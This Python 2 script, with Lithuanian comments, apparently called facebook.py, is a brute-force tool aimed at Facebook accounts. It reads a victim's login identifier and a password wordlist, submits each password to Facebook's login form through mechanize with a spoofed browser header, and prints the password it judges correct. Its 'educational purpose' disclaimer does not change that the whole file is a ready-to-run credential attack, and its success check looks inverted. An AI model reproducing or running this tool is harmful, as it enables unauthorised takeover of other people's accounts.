#!usr/bin/python
import sys   ## iveda bibliotekas i koda ir paruosia jas naudojimui
import random
import mechanize
import cookielib
##import time
GHT = '''
	Pradedama Brute-Force ataka muhahahahaha!!
'''
print"!!!Si programa sukurta mokomajam tikslui ir naudojimas sios programos kitiems reikmems yra nelegalus!!!"
email = str(raw_input("# Irasykite |Elektronini pasta| |Telefono numeri| |Profilio ID numeri| |Prisijungimo varda| : ")) ## irasomi log in vardas
passwordlist = str(raw_input("# Irasykite slaptazodzio faila : ")) ## irasomas passwordu failas

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] ## biblioteka, kuri atpazista prietaisus ir ju galimybes

login = 'https://www.facebook.com/login.php?login_attempt=1' ## website'o kuri norime nulauzti prisijungimo forma
def attack(password):

  try:     
     sys.stdout.write("\r[*] Bandomas %s.. " % password) ## paraso, kuris passwordas dabar bandomas
     ##sys.stdout.flush() sita reikia patikrinti kali linuxuose
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login) ## atidaro log in forma
     br.select_form(nr=0)
      
         
     ##Facebook
     br.form['email'] = email
     br.form['pass'] = password
     br.submit() ## iveda prisijungimo duomenis
     log = br.geturl()
     if log == login: ## tikrina, ar slaptazodis sutinka su tekstiniame faile esanciu slaptazodziu
        print "\n\n\n [*] Slaptazodis rastas .. !!"
        print "\n [*] Slaptazodis : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt: ## jei suvedama CTRL + C kombinacija - programa isjungiama
        print "\n[*] Programa isjungiama .. "
        sys.exit(1)

def search(): ## ima kita skaptazodi is tekstinio failo
    global password
    for password in passwords:
        attack(password.replace("\n",""))
        ##time.sleep(0)


def check(): ## iesko ar nera Brute-Force tukdanciu faktoriu, jei ju yra - tai juos praleidzia automatiskai(?)

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt: ## jei suvedama CTRL + C kombinacija - programa isjungiama
       print "\n[*] Programa isjungiama ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r") ## atidaromas slaptazodziu failas
       passwords = list.readlines() ## skaitomas slaptazodziu failas
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError: ## jei tokio failo nera kodo aplanke, ispausdinamas erroras, kuris pasako, kad slaptazodzio failas yra ne toks arba jo nera
        print "\n [*] Error: patikrink slaptazodziu saraso kelia \n"
        sys.exit(1)
    except KeyboardInterrupt: ## jei suvedama CTRL + C kombinacija - programa isjungiama
        print "\n [*] Programa isjungiama ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Lauziama paskyra : %s" % (email) ## nurodomas log in vardas
        print " [*] Pakrauti :" , len(passwords), "passwords" ## nusako slaptazodziu kieki faile
        print " [*] Lauziamasi, prasome palaukti ..."
    except KeyboardInterrupt: ## jei suvedama CTRL + C kombinacija - programa isjungiama
        print "\n [*] Programa isjungiama ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt: ## jei suvedama CTRL + C kombinacija - programa isjungiama
        print "\n [*] Programa isjungiama ..\n"
        sys.exit(1)
        

if __name__ == '__main__':
    check()
facebook.py
